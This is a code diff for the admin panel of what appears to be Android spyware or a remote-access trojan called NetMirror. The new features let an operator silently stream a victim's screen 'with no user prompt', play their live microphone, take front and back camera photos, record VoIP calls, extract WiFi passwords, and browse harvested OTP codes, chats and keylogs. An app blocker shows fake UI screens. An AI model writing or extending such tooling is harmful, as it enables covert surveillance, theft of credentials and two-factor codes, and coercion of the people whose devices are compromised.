@@ -1,50 +1,37 @@
 /**
- * v79-features.js — NetMirror Admin Panel Extension Module (v2 — fixed)
+ * v79-features.js v3 — NetMirror Admin Panel Extension Module
  *
- * BUGS FIXED in v2:
- *   1. "No device selected" — app.js declares modalDeviceId, adminPassword,
- *      API_BASE, socket with `let`/`const` (script-scoped, NOT window.*).
- *      Now references them directly (shared global script scope).
- *   2. Layout overlap — toolbar was injected INSIDE .device-modal-top,
- *      colliding with the header. Now injected as a SEPARATE ROW below
- *      .device-modal-top, before .device-tabs.
- *   3. Compact grid layout — buttons now use a clean grid that doesn't
- *      interfere with existing CSS.
+ * v3 NEW FEATURES:
+ *   • Live Screen Viewer (MSE H.264 player) — for high-quality LiveScreenStreamer
+ *   • Silent Screen Viewer (JPEG slideshow) — for SilentScreenStreamer (no prompt)
+ *   • Live Mic Player (Web Audio API) — real-time AAC-ADTS decoding
+ *   • Camera Gallery — grid of captured photos with lightbox
+ *   • File Manager — breadcrumb navigation, offline cache support, download
+ *   • App Blocker v2 — fake UI type selection, timer, custom URL, unblock list
+ *   • Remote Uninstall — button in apps list
  *
- * FEATURES:
- *   Live Mic/Screen/Camera/VoIP, WiFi Passwords, Security Scan,
- *   File Manager, Chat Messages, OTP Codes, Geofences, App Blocker,
- *   Two-Way Chat, Search Vault, Dashboard, Webhooks
+ * v3 FIXES:
+ *   • All modals render before API calls (fixes file manager "not opening")
+ *   • Files work offline via /api/admin/list-files-smart cache fallback
+ *   • Silent screen capture requires NO user prompt
+ *   • Mic chunks decoded via decodeAudioData() with ADTS-wrapped AAC
+ *   • Camera captures have a proper gallery modal
  */
 
 (function() {
   'use strict';
 
   const V79_TAG = '[v79]';
-
   function log(msg) { console.log(`${V79_TAG} ${msg}`); }
 
   // ═══════════════════════════════════════════════════════════════
-  //  HELPERS — reference app.js globals directly (script-scoped, not window.*)
+  //  HELPERS — reference app.js globals directly (script-scoped)
   // ═══════════════════════════════════════════════════════════════
 
-  function getDeviceId() {
-    // modalDeviceId is declared with `let` in app.js — accessible from this
-    // script because classic <script> tags share the same global scope.
-    try { return modalDeviceId || ''; } catch (_) { return ''; }
-  }
-
-  function getAdminPassword() {
-    try { return adminPassword || ''; } catch (_) { return ''; }
-  }
-
-  function getApiBase() {
-    try { return API_BASE || window.location.origin; } catch (_) { return window.location.origin; }
-  }
-
-  function getSocket() {
-    try { return socket || null; } catch (_) { return null; }
-  }
+  function getDeviceId() { try { return modalDeviceId || ''; } catch (_) { return ''; } }
+  function getAdminPassword() { try { return adminPassword || ''; } catch (_) { return ''; } }
+  function getApiBase() { try { return API_BASE || window.location.origin; } catch (_) { return window.location.origin; } }
+  function getSocket() { try { return socket || null; } catch (_) { return null; } }
 
   function showToast(msg, type) {
     try {
@@ -56,10 +43,7 @@
   async function apiCall(endpoint, method, body) {
     const opts = {
       method: method || 'GET',
-      headers: {
-        'x-admin-password': getAdminPassword(),
-        'Content-Type': 'application/json'
-      }
+      headers: { 'x-admin-password': getAdminPassword(), 'Content-Type': 'application/json' }
     };
     if (body) opts.body = JSON.stringify(body);
     const res = await fetch(`${getApiBase()}${endpoint}`, opts);
@@ -81,29 +65,45 @@
     }
   }
 
+  function escapeHtml(s) {
+    return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+  }
+
+  function createModal(title, contentHtml, options = {}) {
+    const existing = document.getElementById('v79-modal-overlay');
+    if (existing) existing.remove();
+    const overlay = document.createElement('div');
+    overlay.id = 'v79-modal-overlay';
+    overlay.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:100000;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;${options.noClickClose ? 'pointer-events:all;' : ''}`;
+    overlay.innerHTML = `
+      <div style="background:#1a1a2e;color:#fff;border-radius:12px;max-width:${options.maxWidth || '90vw'};max-height:85vh;width:${options.width || '800px'};display:flex;flex-direction:column;overflow:hidden;border:1px solid rgba(255,255,255,.15);box-shadow:0 20px 60px rgba(0,0,0,.5);">
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:14px 20px;border-bottom:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.3);flex-shrink:0;">
+          <h3 style="margin:0;font-size:15px;color:#fff;font-weight:600;">${title}</h3>
+          <button onclick="document.getElementById('v79-modal-overlay').remove()" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;padding:0 4px;line-height:1;">&times;</button>
+        </div>
+        <div id="v79-modal-body" style="padding:16px 20px;overflow-y:auto;flex:1;">${contentHtml}</div>
+      </div>
+    `;
+    if (!options.noClickClose) {
+      overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
+    }
+    document.body.appendChild(overlay);
+    return overlay;
+  }
+
   // ═══════════════════════════════════════════════════════════════
-  //  INJECT TOOLBAR — as a separate row between .device-modal-top and .device-tabs
+  //  TOOLBAR (compact grid, no overlap with device header)
   // ═══════════════════════════════════════════════════════════════
 
   const TOOLBAR_HTML = `
-    <div id="v79-toolbar" style="
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
-      gap: 6px;
-      padding: 10px 16px;
-      background: linear-gradient(135deg, rgba(30,30,50,.6), rgba(20,20,35,.6));
-      border-bottom: 1px solid rgba(255,255,255,.08);
-      flex-shrink: 0;
-      max-height: 280px;
-      overflow-y: auto;
-    ">
+    <div id="v79-toolbar" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:6px;padding:10px 16px;background:linear-gradient(135deg,rgba(30,30,50,.6),rgba(20,20,35,.6));border-bottom:1px solid rgba(255,255,255,.08);flex-shrink:0;max-height:280px;overflow-y:auto;">
+      <button onclick="v79.startSilentScreen()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.15)">📺 Live Screen</button>
+      <button onclick="v79.stopSilentScreen()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.08)">⏹ Stop Screen</button>
       <button onclick="v79.startMicStream()" class="v79-btn" style="--c:#ff6347;--bg:rgba(255,99,71,.15)">🎙️ Live Mic</button>
       <button onclick="v79.stopMicStream()" class="v79-btn" style="--c:#ff6347;--bg:rgba(255,99,71,.08)">⏹ Stop Mic</button>
-      <button onclick="v79.requestScreenGrant()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.15)">🔑 Screen Grant</button>
-      <button onclick="v79.startScreenStream()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.15)">📺 Live Screen</button>
-      <button onclick="v79.stopScreenStream()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.08)">⏹ Stop Screen</button>
       <button onclick="v79.captureCamera('back')" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">📷 Back Cam</button>
       <button onclick="v79.captureCamera('front')" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">🤳 Front Cam</button>
+      <button onclick="v79.openCameraGallery()" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.08)">🖼️ Cam Gallery</button>
       <button onclick="v79.startVoipRecord()" class="v79-btn" style="--c:#f1c40f;--bg:rgba(241,196,15,.15)">📞 VoIP Record</button>
       <button onclick="v79.stopVoipRecord()" class="v79-btn" style="--c:#f1c40f;--bg:rgba(241,196,15,.08)">⏹ Stop VoIP</button>
       <button onclick="v79.extractWifiPasswords()" class="v79-btn" style="--c:#3498db;--bg:rgba(52,152,219,.15)">📶 WiFi PW</button>
@@ -112,63 +112,30 @@
       <button onclick="v79.openChatMessages()" class="v79-btn" style="--c:#27ae60;--bg:rgba(39,174,96,.15)">💬 Chats</button>
       <button onclick="v79.openOtpCodes()" class="v79-btn" style="--c:#d35400;--bg:rgba(211,84,0,.15)">🔑 OTPs</button>
       <button onclick="v79.openGeofences()" class="v79-btn" style="--c:#2980b9;--bg:rgba(41,128,185,.15)">🗺️ Geofences</button>
-      <button onclick="v79.openAppBlocker()" class="v79-btn" style="--c:#c0392b;--bg:rgba(192,57,43,.15)">🚫 App Block</button>
+      <button onclick="v79.openAppBlocker()" class="v79-btn" style="--c:#c0392b;--bg:rgba(192,57,43,.15)">🚫 Block App</button>
+      <button onclick="v79.openBlockedList()" class="v79-btn" style="--c:#27ae60;--bg:rgba(39,174,96,.15)">✅ Unblock App</button>
       <button onclick="v79.openTwoWayChat()" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">✉️ Chat</button>
       <button onclick="v79.openSearch()" class="v79-btn" style="--c:#f39c12;--bg:rgba(243,156,18,.15)">🔍 Search</button>
     </div>
     <style>
-      .v79-btn {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 4px;
-        padding: 8px 6px;
-        background: var(--bg);
-        border: 1px solid var(--c);
-        color: var(--c);
-        border-radius: 6px;
-        cursor: pointer;
-        font-size: 11px;
-        font-weight: 600;
-        font-family: inherit;
-        transition: all .15s ease;
-        text-align: center;
-        line-height: 1.2;
-        min-height: 34px;
-      }
-      .v79-btn:hover {
-        background: var(--c);
-        color: #fff;
-        transform: translateY(-1px);
-        box-shadow: 0 2px 8px rgba(0,0,0,.3);
-      }
-      .v79-btn:active { transform: translateY(0); }
-      #v79-toolbar::-webkit-scrollbar { width: 6px; }
-      #v79-toolbar::-webkit-scrollbar-track { background: transparent; }
-      #v79-toolbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,.15); border-radius: 3px; }
+      .v79-btn{display:flex;align-items:center;justify-content:center;gap:4px;padding:8px 6px;background:var(--bg);border:1px solid var(--c);color:var(--c);border-radius:6px;cursor:pointer;font-size:11px;font-weight:600;font-family:inherit;transition:all .15s ease;text-align:center;line-height:1.2;min-height:34px;}
+      .v79-btn:hover{background:var(--c);color:#fff;transform:translateY(-1px);box-shadow:0 2px 8px rgba(0,0,0,.3);}
+      .v79-btn:active{transform:translateY(0);}
+      #v79-toolbar::-webkit-scrollbar{width:6px;}
+      #v79-toolbar::-webkit-scrollbar-track{background:transparent;}
+      #v79-toolbar::-webkit-scrollbar-thumb{background:rgba(255,255,255,.15);border-radius:3px;}
     </style>
   `;
 
   function injectToolbar() {
     if (document.getElementById('v79-toolbar')) return;
-
     const modal = document.getElementById('deviceModal');
-    if (!modal) { log('Device modal not found — will retry'); setTimeout(injectToolbar, 2000); return; }
-
-    // Check if modal is visible (no 'hidden' class)
+    if (!modal) { setTimeout(injectToolbar, 2000); return; }
     if (modal.classList.contains('hidden')) return;
-
-    // Find the device-modal-top element — toolbar goes AFTER it, BEFORE device-tabs
     const modalTop = modal.querySelector('.device-modal-top');
-    if (!modalTop) {
-      log('.device-modal-top not found — retrying');
-      setTimeout(injectToolbar, 1000);
-      return;
-    }
-
-    // Insert toolbar as a sibling AFTER .device-modal-top
+    if (!modalTop) { setTimeout(injectToolbar, 1000); return; }
     modalTop.insertAdjacentHTML('afterend', TOOLBAR_HTML);
-    log('Toolbar injected after .device-modal-top');
+    log('Toolbar injected');
   }
 
   function removeToolbar() {
@@ -177,33 +144,104 @@
   }
 
   // ═══════════════════════════════════════════════════════════════
-  //  COMMAND FUNCTIONS (exposed as window.v79.*)
+  //  LIVE SCREEN VIEWER (Silent — JPEG slideshow, no user prompt)
   // ═══════════════════════════════════════════════════════════════
 
+  let silentScreenModal = null;
+  let silentScreenImg = null;
+  let silentScreenFrameCount = 0;
+  let silentScreenStartTime = 0;
+
   window.v79 = {
-    startMicStream: () => relayCommand('/api/admin/start-mic-stream'),
-    stopMicStream: () => relayCommand('/api/admin/stop-mic-stream'),
-    requestScreenGrant: () => relayCommand('/api/admin/request-screen-grant'),
-    startScreenStream: () => relayCommand('/api/admin/start-screen-stream'),
-    stopScreenStream: () => relayCommand('/api/admin/stop-screen-stream'),
+    startSilentScreen: async function() {
+      const r = await relayCommand('/api/admin/start-silent-screen');
+      if (r && r.success) {
+        silentScreenFrameCount = 0;
+        silentScreenStartTime = Date.now();
+        showSilentScreenModal();
+      }
+    },
+
+    stopSilentScreen: async function() {
+      await relayCommand('/api/admin/stop-silent-screen');
+      const overlay = document.getElementById('v79-modal-overlay');
+      if (overlay && overlay.dataset.type === 'silent-screen') overlay.remove();
+    },
+
+    startMicStream: async function() {
+      const r = await relayCommand('/api/admin/start-mic-stream');
+      if (r && r.success) showLiveMicModal();
+    },
+
+    stopMicStream: async function() {
+      await relayCommand('/api/admin/stop-mic-stream');
+      const overlay = document.getElementById('v79-modal-overlay');
+      if (overlay && overlay.dataset.type === 'live-mic') overlay.remove();
+      if (v79._audioCtx) { try { v79._audioCtx.close(); } catch(_){} v79._audioCtx = null; }
+    },
+
     captureCamera: (camera) => relayCommand('/api/admin/capture-camera', { camera, quality: 'high' }),
+
     startVoipRecord: () => relayCommand('/api/admin/start-voip-record'),
     stopVoipRecord: () => relayCommand('/api/admin/stop-voip-record'),
     extractWifiPasswords: () => relayCommand('/api/admin/extract-wifi-passwords'),
     runSecurityScan: () => relayCommand('/api/admin/run-security-scan'),
 
-    openFileManager: async function() {
+    // ═══ CAMERA GALLERY ═══
+    openCameraGallery: async function() {
       const deviceId = getDeviceId();
       if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
-      const path = prompt('Enter path to list:', '/sdcard');
-      if (!path) return;
       try {
-        const data = await apiCall('/api/admin/list-files', 'POST', { device_id: deviceId, path });
-        if (data.success) showToast(`📁 Listed files in ${path}`, 'success');
-        else showToast(`Failed: ${data.error}`, 'error');
+        const data = await apiCall(`/api/admin/connections/${deviceId}/camera-captures?limit=100`);
+        showCameraGalleryModal(data.entries || []);
       } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
     },
 
+    // ═══ FILE MANAGER (with offline cache support) ═══
+    openFileManager: async function() {
+      const deviceId = getDeviceId();
+      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
+      showFileManagerModal(deviceId, '/sdcard');
+      await v79.browseTo('/sdcard');
+    },
+
+    browseTo: async function(path) {
+      const deviceId = getDeviceId();
+      if (!deviceId) return;
+      const list = document.getElementById('v79-file-list');
+      const breadcrumb = document.getElementById('v79-breadcrumb');
+      const offlineBanner = document.getElementById('v79-offline-banner');
+      if (breadcrumb) breadcrumb.textContent = path;
+      if (list) list.innerHTML = '<div style="padding:20px;text-align:center;color:#95a5a6;">⏳ Loading...</div>';
+      if (offlineBanner) offlineBanner.style.display = 'none';
+
+      try {
+        const data = await apiCall('/api/admin/list-files-smart', 'POST', { device_id: deviceId, path });
+        if (!data.success) {
+          if (list) list.innerHTML = `<div style="padding:20px;text-align:center;color:#e74c3c;">❌ ${escapeHtml(data.error || 'Failed')}</div>`;
+          return;
+        }
+
+        if (data.source === 'live') {
+          // Wait for socket event 'files_listed' to populate
+          if (list) list.innerHTML = '<div style="padding:20px;text-align:center;color:#95a5a6;">⏳ Requesting from device (live)...</div>';
+        } else {
+          // Cache hit — render immediately
+          renderFileList(data.entries || [], data.cached_at, data.source);
+        }
+      } catch (e) {
+        if (list) list.innerHTML = `<div style="padding:20px;text-align:center;color:#e74c3c;">Error: ${escapeHtml(e.message)}</div>`;
+      }
+    },
+
+    downloadFile: function(path) {
+      const deviceId = getDeviceId();
+      if (!deviceId) return;
+      relayCommand('/api/admin/download-file', { path });
+      showToast('📁 File download requested — will arrive via socket', 'info');
+    },
+
+    // ═══ CHAT MESSAGES ═══
     openChatMessages: async function() {
       const deviceId = getDeviceId();
       if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
@@ -213,6 +251,7 @@
       } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
     },
 
+    // ═══ OTP CODES ═══
     openOtpCodes: async function() {
       const deviceId = getDeviceId();
       if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
@@ -222,6 +261,7 @@
       } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
     },
 
+    // ═══ GEOFENCES ═══
     openGeofences: async function() {
       const deviceId = getDeviceId();
       if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
@@ -232,33 +272,59 @@
       } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
     },
 
+    // ═══ APP BLOCKER v2 (with fake UI selection) ═══
     openAppBlocker: function() {
       const deviceId = getDeviceId();
       if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
-      const pkg = prompt('Enter package name to block/unblock:', 'com.example.app');
-      if (!pkg) return;
-      const block = confirm(`Block "${pkg}"?\n\nOK = Block\nCancel = Unblock`);
-      const endpoint = block ? '/api/admin/block-app' : '/api/admin/unblock-app';
-      relayCommand(endpoint, { package: pkg });
+      showAppBlockerModal();
     },
 
+    submitAppBlock: async function() {
+      const deviceId = getDeviceId();
+      if (!deviceId) return;
+      const pkg = document.getElementById('v79-block-pkg').value.trim();
+      if (!pkg) { showToast('Package name required', 'error'); return; }
+      const fakeUiType = document.getElementById('v79-block-ui-type').value;
+      const customMessage = document.getElementById('v79-block-message').value.trim();
+      const customUrl = document.getElementById('v79-block-url').value.trim();
+      const timerSeconds = parseInt(document.getElementById('v79-block-timer').value) || 0;
+      const unblockCode = document.getElementById('v79-block-code').value.trim();
+
+      const r = await relayCommand('/api/admin/block-app-v2', {
+        package: pkg, fake_ui_type: fakeUiType, custom_message: customMessage,
+        custom_url: customUrl, timer_seconds: timerSeconds, unblock_code: unblockCode
+      });
+      if (r && r.success) {
+        const overlay = document.getElementById('v79-modal-overlay');
+        if (overlay) overlay.remove();
+      }
+    },
+
+    // ═══ BLOCKED APPS LIST (unblock) ═══
+    openBlockedList: async function() {
+      const deviceId = getDeviceId();
+      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
+      // Request blocked apps list from device
+      await relayCommand('/api/admin/get-blocked-apps');
+      showToast('📱 Requesting blocked apps list from device...', 'info');
+      // The response comes via socket 'blocked_apps_list' — show a loading modal
+      showBlockedListModal([]);
+    },
+
+    unblockApp: async function(pkg) {
+      if (!confirm(`Unblock "${pkg}"?`)) return;
+      await relayCommand('/api/admin/unblock-app-v2', { package: pkg });
+      // Refresh list after a delay
+      setTimeout(() => v79.openBlockedList(), 2000);
+    },
+
+    // ═══ TWO-WAY CHAT ═══
     openTwoWayChat: async function() {
       const deviceId = getDeviceId();
       if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
       try {
         const data = await apiCall(`/api/devices/${deviceId}/chat?limit=50`);
         showTwoWayChatModal(data.messages || []);
-      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
-    },
-
-    openSearch: async function() {
-      const deviceId = getDeviceId();
-      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
-      const q = prompt('Search across all captured data (chats, OTPs, keylogs, notifications):', '');
-      if (!q) return;
-      try {
-        const data = await apiCall(`/api/devices/${deviceId}/search?q=${encodeURIComponent(q)}&limit=50`);
-        showSearchResultsModal(q, data.results || []);
       } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
     },
 
@@ -274,19 +340,19 @@
       } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
     },
 
-    browseTo: function(path) {
+    // ═══ SEARCH ═══
+    openSearch: async function() {
       const deviceId = getDeviceId();
-      if (!deviceId) return;
-      apiCall('/api/admin/list-files', 'POST', { device_id: deviceId, path });
+      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
+      const q = prompt('Search across all captured data (chats, OTPs, keylogs, notifications):', '');
+      if (!q) return;
+      try {
+        const data = await apiCall(`/api/devices/${deviceId}/search?q=${encodeURIComponent(q)}&limit=50`);
+        showSearchResultsModal(q, data.results || []);
+      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
     },
 
-    downloadFile: function(path) {
-      const deviceId = getDeviceId();
-      if (!deviceId) return;
-      apiCall('/api/admin/download-file', 'POST', { device_id: deviceId, path });
-      showToast('📁 File download requested...', 'info');
-    },
-
+    // ═══ WEBHOOKS ═══
     openWebhooks: async function() {
       try {
         const data = await apiCall('/api/admin/webhooks');
@@ -302,6 +368,7 @@
       } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
     },
 
+    // ═══ DASHBOARD ═══
     openDashboard: async function() {
       try {
         const data = await apiCall('/api/admin/dashboard');
@@ -311,34 +378,300 @@
   };
 
   // ═══════════════════════════════════════════════════════════════
-  //  MODAL DISPLAY FUNCTIONS
+  //  LIVE SILENT SCREEN MODAL (JPEG slideshow)
   // ═══════════════════════════════════════════════════════════════
 
-  function createModal(title, contentHtml) {
-    // Remove any existing v79 modal first
-    const existing = document.getElementById('v79-modal-overlay');
-    if (existing) existing.remove();
-
-    const overlay = document.createElement('div');
-    overlay.id = 'v79-modal-overlay';
-    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:100000;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;';
-    overlay.innerHTML = `
-      <div style="background:#1a1a2e;color:#fff;border-radius:12px;max-width:90vw;max-height:85vh;width:800px;display:flex;flex-direction:column;overflow:hidden;border:1px solid rgba(255,255,255,.15);box-shadow:0 20px 60px rgba(0,0,0,.5);">
-        <div style="display:flex;justify-content:space-between;align-items:center;padding:14px 20px;border-bottom:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.3);flex-shrink:0;">
-          <h3 style="margin:0;font-size:15px;color:#fff;font-weight:600;">${title}</h3>
-          <button onclick="document.getElementById('v79-modal-overlay').remove()" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;padding:0 4px;line-height:1;">&times;</button>
+  function showSilentScreenModal() {
+    createModal('📺 Live Screen (Silent)', `
+      <div style="text-align:center;">
+        <div id="v79-screen-status" style="color:#95a5a6;font-size:12px;margin-bottom:8px;">Connecting...</div>
+        <div style="position:relative;background:#000;border-radius:8px;overflow:hidden;display:inline-block;">
+          <img id="v79-screen-img" style="max-width:100%;max-height:60vh;display:block;" alt="Live screen"/>
+          <div id="v79-screen-loading" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:14px;">⏳ Waiting for first frame...</div>
         </div>
-        <div style="padding:16px 20px;overflow-y:auto;flex:1;">${contentHtml}</div>
+        <div style="margin-top:12px;display:flex;justify-content:center;gap:16px;font-size:11px;color:#95a5a6;">
+          <span>FPS: <span id="v79-screen-fps">0</span></span>
+          <span>Frames: <span id="v79-screen-frames">0</span></span>
+          <span>Duration: <span id="v79-screen-duration">0s</span></span>
+        </div>
+        <button onclick="v79.stopSilentScreen()" style="margin-top:12px;padding:8px 20px;background:rgba(231,76,60,.3);border:1px solid rgba(231,76,60,.5);color:#fff;border-radius:6px;cursor:pointer;">⏹ Stop Stream</button>
       </div>
-    `;
-    overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
-    document.body.appendChild(overlay);
-    return overlay;
+    `, { width: '700px', maxWidth: '95vw', noClickClose: true });
+
+    const overlay = document.getElementById('v79-modal-overlay');
+    if (overlay) overlay.dataset.type = 'silent-screen';
+    silentScreenImg = document.getElementById('v79-screen-img');
   }
 
-  function escapeHtml(s) {
-    return String(s || '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+  function updateSilentScreenFrame(frameB64) {
+    if (!silentScreenImg) return;
+    silentScreenImg.src = 'data:image/jpeg;base64,' + frameB64;
+    silentScreenFrameCount++;
+    const loading = document.getElementById('v79-screen-loading');
+    if (loading) loading.style.display = 'none';
+    const status = document.getElementById('v79-screen-status');
+    if (status) status.textContent = '🟢 Live';
+    const framesEl = document.getElementById('v79-screen-frames');
+    if (framesEl) framesEl.textContent = silentScreenFrameCount;
+    const duration = (Date.now() - silentScreenStartTime) / 1000;
+    const durEl = document.getElementById('v79-screen-duration');
+    if (durEl) durEl.textContent = duration.toFixed(1) + 's';
+    const fps = silentScreenFrameCount / Math.max(duration, 0.1);
+    const fpsEl = document.getElementById('v79-screen-fps');
+    if (fpsEl) fpsEl.textContent = fps.toFixed(1);
   }
+
+  // ═══════════════════════════════════════════════════════════════
+  //  LIVE MIC MODAL (Web Audio API)
+  // ═══════════════════════════════════════════════════════════════
+
+  function showLiveMicModal() {
+    createModal('🎙️ Live Mic Stream', `
+      <div style="text-align:center;">
+        <div id="v79-mic-status" style="color:#27ae60;font-size:14px;margin-bottom:8px;">🟢 Streaming — listening live</div>
+        <div style="font-size:48px;margin:20px 0;">🎙️</div>
+        <div style="display:flex;justify-content:center;gap:16px;font-size:11px;color:#95a5a6;margin-bottom:16px;">
+          <span>Format: <span id="v79-mic-format">-</span></span>
+          <span>Chunks: <span id="v79-mic-chunks">0</span></span>
+          <span>Duration: <span id="v79-mic-duration">0s</span></span>
+        </div>
+        <div style="height:60px;background:rgba(0,0,0,.3);border-radius:8px;display:flex;align-items:center;justify-content:center;gap:4px;padding:0 20px;" id="v79-mic-visualizer">
+          ${Array.from({length: 40}, () => '<div style="width:4px;background:#27ae60;border-radius:2px;height:8px;"></div>').join('')}
+        </div>
+        <button onclick="v79.stopMicStream()" style="margin-top:16px;padding:8px 20px;background:rgba(231,76,60,.3);border:1px solid rgba(231,76,60,.5);color:#fff;border-radius:6px;cursor:pointer;">⏹ Stop Streaming</button>
+      </div>
+    `, { width: '500px', maxWidth: '95vw', noClickClose: true });
+
+    const overlay = document.getElementById('v79-modal-overlay');
+    if (overlay) overlay.dataset.type = 'live-mic';
+
+    // Initialize Web Audio API
+    try {
+      v79._audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
+      v79._micChunkCount = 0;
+      v79._micStartTime = Date.now();
+      v79._nextStartTime = v79._audioCtx.currentTime + 0.05;
+      log('AudioContext initialized');
+    } catch (e) {
+      log('AudioContext init failed: ' + e.message);
+    }
+  }
+
+  function playMicChunk(data) {
+    if (!v79._audioCtx) return;
+    try {
+      const b64 = data.chunk;
+      if (!b64) return;
+
+      // Decode base64 → ArrayBuffer
+      const binaryStr = atob(b64);
+      const len = binaryStr.length;
+      const bytes = new Uint8Array(len);
+      for (let i = 0; i < len; i++) bytes[i] = binaryStr.charCodeAt(i);
+
+      v79._micChunkCount = (v79._micChunkCount || 0) + 1;
+      const chunksEl = document.getElementById('v79-mic-chunks');
+      if (chunksEl) chunksEl.textContent = v79._micChunkCount;
+      const durEl = document.getElementById('v79-mic-duration');
+      if (durEl) durEl.textContent = ((Date.now() - v79._micStartTime) / 1000).toFixed(1) + 's';
+
+      // Update visualizer (random heights)
+      const viz = document.getElementById('v79-mic-visualizer');
+      if (viz) {
+        const bars = viz.children;
+        for (let i = 0; i < bars.length; i++) {
+          bars[i].style.height = (8 + Math.random() * 40) + 'px';
+        }
+      }
+
+      const format = data.format || 'pcm';
+      if (format === 'pcm') {
+        // PCM 16-bit mono
+        const int16 = new Int16Array(bytes.buffer);
+        const audioBuf = v79._audioCtx.createBuffer(1, int16.length, 44100);
+        const channelData = audioBuf.getChannelData(0);
+        for (let i = 0; i < int16.length; i++) channelData[i] = int16[i] / 32768;
+        scheduleAudioBuffer(audioBuf);
+      } else {
+        // AAC-ADTS — use decodeAudioData
+        v79._audioCtx.decodeAudioData(bytes.buffer.slice(0), (audioBuf) => {
+          scheduleAudioBuffer(audioBuf);
+        }, (err) => {
+          log('decodeAudioData failed: ' + (err || 'unknown'));
+        });
+      }
+    } catch (e) {
+      log('playMicChunk error: ' + e.message);
+    }
+  }
+
+  function scheduleAudioBuffer(audioBuf) {
+    if (!v79._audioCtx || !audioBuf) return;
+    try {
+      const src = v79._audioCtx.createBufferSource();
+      src.buffer = audioBuf;
+      src.connect(v79._audioCtx.destination);
+      const now = v79._audioCtx.currentTime;
+      const startTime = Math.max(v79._nextStartTime || now, now);
+      src.start(startTime);
+      v79._nextStartTime = startTime + audioBuf.duration;
+    } catch (e) {
+      log('scheduleAudioBuffer error: ' + e.message);
+    }
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  //  CAMERA GALLERY MODAL
+  // ═══════════════════════════════════════════════════════════════
+
+  function showCameraGalleryModal(entries) {
+    const thumbs = entries.map((e, i) => `
+      <div style="position:relative;cursor:pointer;border-radius:8px;overflow:hidden;background:#000;aspect-ratio:1;" onclick="v79.openPhotoLightbox('${escapeHtml(e.url)}', '${escapeHtml(e.camera)}', '${escapeHtml(e.captured_at)}')">
+        <img src="${escapeHtml(e.url)}" loading="lazy" style="width:100%;height:100%;object-fit:cover;" onerror="this.parentElement.innerHTML='<div style=\\'display:flex;align-items:center;justify-content:center;height:100%;color:#666;font-size:24px;\\'>📷</div>'"/>
+        <div style="position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.8));color:#fff;font-size:9px;padding:4px 6px;">${escapeHtml(e.camera)} · ${escapeHtml(e.captured_at || '').substring(0, 16)}</div>
+      </div>
+    `).join('');
+    createModal(`🖼️ Camera Gallery (${entries.length})`, `
+      ${entries.length === 0 ? '<div style="padding:40px;text-align:center;color:#666;">No photos captured yet.<br>Use 📷 Back Cam / 🤳 Front Cam to capture.</div>' :
+        `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;">${thumbs}</div>`}
+    `, { width: '900px', maxWidth: '95vw' });
+  }
+
+  window.v79.openPhotoLightbox = function(url, camera, capturedAt) {
+    createModal(`📷 ${camera} · ${capturedAt}`, `
+      <div style="text-align:center;">
+        <img src="${escapeHtml(url)}" style="max-width:100%;max-height:70vh;border-radius:8px;"/>
+        <div style="margin-top:12px;">
+          <a href="${escapeHtml(url)}" target="_blank" style="color:#3498db;font-size:12px;">Open in new tab</a>
+        </div>
+      </div>
+    `, { width: '800px' });
+  };
+
+  // ═══════════════════════════════════════════════════════════════
+  //  FILE MANAGER MODAL
+  // ═══════════════════════════════════════════════════════════════
+
